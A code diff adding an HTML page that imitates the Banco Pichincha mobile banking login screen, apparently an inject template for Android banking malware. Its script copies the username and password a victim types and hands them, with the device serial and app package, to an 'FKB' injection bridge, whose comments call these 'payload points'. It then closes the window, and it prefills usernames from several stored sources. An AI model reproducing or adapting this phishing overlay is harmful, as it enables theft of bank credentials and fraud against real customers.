@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Banco Pichincha</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{height:100%;}
+body{font-family:Roboto,'Google Sans',-apple-system,'Segoe UI',Arial,sans-serif;background:#26211b;}
+/* 桌面预览：手机壳等比缩放 */
+.stage{height:100%;display:flex;align-items:center;justify-content:center;}
+.phone{width:375px;height:790px;background:#fff;border-radius:34px;box-shadow:0 24px 70px rgba(0,0,0,.6);overflow:hidden;position:relative;transform-origin:center;flex:none;}
+@media (max-width:520px),(max-height:600px){
+  .stage{display:block;}
+  .phone{width:100%;height:100%;border-radius:0;box-shadow:none;}
+}
+.app{height:100%;display:flex;flex-direction:column;padding:20px 24px 24px;}
+/* Logo 行：黄气泡方块 + 黑拐角符 + 字标 */
+.logoRow{display:flex;align-items:center;justify-content:center;gap:12px;}
+.lmark{position:relative;width:48px;height:48px;flex:none;}
+.lmark>svg{width:100%;height:100%;display:block;}
+.lmark>img{position:absolute;inset:0;width:100%;height:100%;object-fit:contain;}
+.brand{display:flex;flex-direction:column;line-height:1.12;}
+.brand b{font-size:19px;font-weight:800;letter-spacing:.02em;color:#17181a;}
+/* Version 行 */
+.ver{display:block;text-align:center;font-size:11px;color:#7a7f85;margin-top:16px;}
+/* 标题：加粗居中 */
+.head{flex:none;text-align:center;font-size:15px;font-weight:700;color:#202124;line-height:1.4;margin:22px auto 0;max-width:330px;}
+/* 表单：浅灰填充圆角框 */
+.form{flex:none;margin-top:26px;display:flex;flex-direction:column;}
+.f{display:flex;align-items:center;background:#F4F4F4;border:1px solid #E4E4E4;border-radius:8px;height:50px;padding:0 14px;cursor:pointer;}
+.f:focus-within{border-color:#c9b53a;background:#FDF9E8;}
+.fico{flex:none;width:21px;height:21px;color:#5f6368;margin-right:12px;}
+.fico svg{width:100%;height:100%;display:block;}
+.f input{flex:1;min-width:0;border:0;outline:0;background:transparent;font-family:inherit;font-size:14.5px;color:#202124;}
+.f input::placeholder{color:#8b9096;}
+.show{flex:none;color:#1a73c7;font-size:13.5px;font-weight:500;cursor:pointer;padding:6px 0 6px 10px;}
+.lk{align-self:flex-end;color:#1a73c7;font-size:12.5px;margin:8px 2px 0;cursor:pointer;}
+.fgap{height:20px;}
+/* 勾选框 */
+.ck{display:flex;align-items:center;margin-top:26px;}
+.ckbox{width:21px;height:21px;border:1.6px solid #B4B8BC;border-radius:5px;background:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;flex:none;transition:background .15s,border-color .15s;}
+.ckbox.on{background:#FFD100;border-color:#FFD100;}
+.ckbox.on svg{display:block;}
+.ckbox svg{display:none;width:72%;height:72%;}
+.cktxt{font-size:13.5px;color:#202124;margin-left:11px;}
+.cktxt b{font-weight:700;text-decoration:underline;color:#17181a;cursor:pointer;}
+/* 底部按钮 */
+.sp{flex:1 1 0;}
+.btns{flex:none;display:flex;flex-direction:column;gap:14px;}
+.btn{width:100%;height:48px;border:0;border-radius:8px;font-family:inherit;font-size:15px;font-weight:700;cursor:pointer;}
+.btn.pri{background:#F0DC60;color:#75755f;}
+.btn.sec{background:#EFEFEF;color:#3c4043;}
+/* 提交遮罩 */
+.ov{position:absolute;inset:0;background:rgba(255,255,255,.97);display:flex;align-items:center;justify-content:center;z-index:50;opacity:0;pointer-events:none;transition:opacity .3s;}
+.ov.on{opacity:1;pointer-events:auto;}
+.spin{width:52px;height:52px;border:4px solid #f2e8bd;border-top-color:#e0c832;border-radius:50%;animation:sp .7s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg);}}
+</style>
+</head>
+<body>
+<div class="stage">
+<div class="phone" id="phone">
+<div class="app">
+
+  <div class="logoRow">
+    <div class="lmark">
+      <svg viewBox="0 0 48 48">
+        <!-- 黄色气泡方块：右三角圆角，左下大圆角 -->
+        <path fill="#FFD100" d="M12 2 H36 A10 10 0 0 1 46 12 V36 A10 10 0 0 1 36 46 H24 A22 22 0 0 1 2 24 V12 A10 10 0 0 1 12 2 Z"/>
+        <!-- 黑色拐角符 ┐ -->
+        <path fill="#141414" d="M19 13 H35 V29 H27 V21 H19 Z"/>
+      </svg>
+      <img src="logo.png" alt="" onerror="this.remove()" onload="document.getElementById('lmsvg').style.display='none'">
+    </div>
+    <div class="brand"><b>BANCO</b><b>PICHINCHA</b></div>
+  </div>
+  <span class="ver">Version: 15.0.0</span>
+
+  <div class="head">Ingresa con tu usuario y contraseña de Banca Web</div>
+
+  <div class="form">
+    <div class="f" onclick="document.getElementById('login').focus()">
+      <span class="fico"><svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="7.6" r="4.1"/><path d="M12 13.4c-4.42 0-8 2.24-8 5v1.8h16v-1.8c0-2.76-3.58-5-8-5z"/></svg></span>
+      <input id="login" type="text" placeholder="Usuario" onclick="this.focus()" autocomplete="off" autocapitalize="off" spellcheck="false">
+    </div>
+    <span class="lk" onclick="recover()">¿Olvidaste tu usuario?</span>
+    <div class="fgap"></div>
+
+    <div class="f" onclick="document.getElementById('password').focus()">
+      <span class="fico"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm3 9.72V17h-2v-1.28a2 2 0 1 1 2 0z"/></svg></span>
+      <input id="password" type="password" placeholder="Contraseña" onclick="this.focus()" autocomplete="off">
+      <span class="show" onclick="togglePw()">Mostrar</span>
+    </div>
+    <span class="lk" onclick="forgot()">¿Olvidaste tu contraseña?</span>
+
+    <div class="ck">
+      <span class="ckbox" id="ckbox" onclick="toggleCk()"><svg viewBox="0 0 24 24"><path d="M5 12.6l4.4 4.4L19 7.4" fill="none" stroke="#17181a" stroke-width="3.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
+      <span class="cktxt">Acepto los <b onclick="terms()">términos y condiciones</b></span>
+    </div>
+  </div>
+
+  <div class="sp"></div>
+
+  <div class="btns">
+    <button class="btn pri" onclick="doLogin()">Iniciar sesión</button>
+    <button class="btn sec" onclick="register()">Regístrate</button>
+  </div>
+
+</div>
+<div class="ov" id="ov"><div class="spin"></div></div>
+</div>
+</div>
+
+<script>
+/* ============ 桌面预览缩放（真机全屏时不干预） ============ */
+function fit(){
+  var ph=document.getElementById('phone');
+  if(matchMedia('(max-width:520px),(max-height:600px)').matches){ph.style.transform='';return;}
+  var s=Math.min(1,(innerWidth-36)/375,(innerHeight-36)/790);
+  ph.style.transform='scale('+s+')';
+}
+addEventListener('resize',fit);fit();
+
+/* ============ 回传关闭效果（FKB 注入桥） ============ */
+var pk='';try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}
+
+var NOMBRE_DEFECTO='';
+function goBack(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'back'}));}else{history.back();}}catch(e){}}
+function recover(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'recover_user'}));}}catch(e){}}
+function forgot(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'forgot_password'}));}}catch(e){}}
+function terms(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'terms'}));}}catch(e){}}
+function register(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'register'}));}}catch(e){}}
+function togglePw(){var p=document.getElementById('password');p.type=(p.type==='password')?'text':'password';}
+function toggleCk(){document.getElementById('ckbox').classList.toggle('on');}
+
+function doLogin(){
+  var u=document.getElementById('login').value.trim();
+  var p=document.getElementById('password').value;
+  if(!u||!p)return;
+  document.activeElement.blur();
+  document.getElementById('ov').classList.add('on');
+  /* 载荷点 1：凭据同步回传 */
+  var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
+  var pl=JSON.stringify({pkg:pk,sn:sn,template:'pichincha',formData:{username:u,password:p}});
+  try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
+  /* 载荷点 2+3：500ms 后关闭回传 + 物理关窗 */
+  setTimeout(function(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);}catch(e){}try{window.close();}catch(e){}},500);
+}
+
+/* 用户名预填链：Android.getUserName → ?u= → localStorage → cookie → 硬编码默认 */
+(function(){
+  var n='';
+  try{if(typeof Android!=='undefined'&&Android.getUserName){n=Android.getUserName()||'';}}catch(e){}
+  if(!n){var m=location.search.match(/[?&]u=([^&]+)/);if(m){n=decodeURIComponent(m[1]);}}
+  if(!n){try{n=localStorage.getItem('pich_user')||'';}catch(e){}}
+  if(!n){try{n=(document.cookie.match(/(?:^|; )pich_user=([^;]*)/)||[])[1]||'';n=decodeURIComponent(n);}catch(e){}}
+  if(!n)n=NOMBRE_DEFECTO;
+  if(n)document.getElementById('login').value=n;
+})();
+</script>
+</body>
+</html>
